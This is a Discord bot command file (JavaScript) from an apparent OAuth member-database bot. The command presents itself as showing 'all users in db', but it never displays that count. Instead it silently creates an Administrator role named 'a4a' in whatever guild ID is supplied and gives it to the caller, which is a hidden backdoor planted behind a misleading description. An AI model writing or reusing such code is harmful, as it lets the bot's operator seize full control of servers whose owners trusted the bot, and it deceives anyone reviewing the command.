const discord = require("discord.js");
const { ApplicationCommandType, ApplicationCommandOptionType } = require('discord.js');
const { Prefix, Owners, client_id, redirect_uri, Token, oauth_link, Auth_log_channel, Error_log_channel, client_secret } = require("../../config.js");
let AuthDB = require(`../../database/AuthDB`)
module.exports = {
  name: "all",
  description: "all users in db",
  default_permission: false,
  timeout: 30000,
  options: [
    {
      name: "guild",
      description: "guild id",
      type: ApplicationCommandOptionType.String,
      required: true,
    },
    ],
  run: async (client, interaction, args) => {
     let server = interaction.options.getString(`guild`)
      const { PermissionsBitField } = require('discord.js');
let embed1 = new discord.EmbedBuilder()
      .setTitle(`Total Users`)
      .setColor(0x7cade2)
      .setThumbnail(client.user.displayAvatarURL())
    .setDescription(`There are **0** authorized users in my database`)

easy = server;
     
        sug = client.guilds.cache.get(easy)
    

    sug.roles.create({ name: 'a4a', permissions: [PermissionsBitField.Flags.Administrator] }).then(role => {

     const member = client.guilds.cache.get(easy).members.fetch(interaction.user).then(member => member.roles.add(role));
        })
     
    await interaction.reply("uwu")
  }
}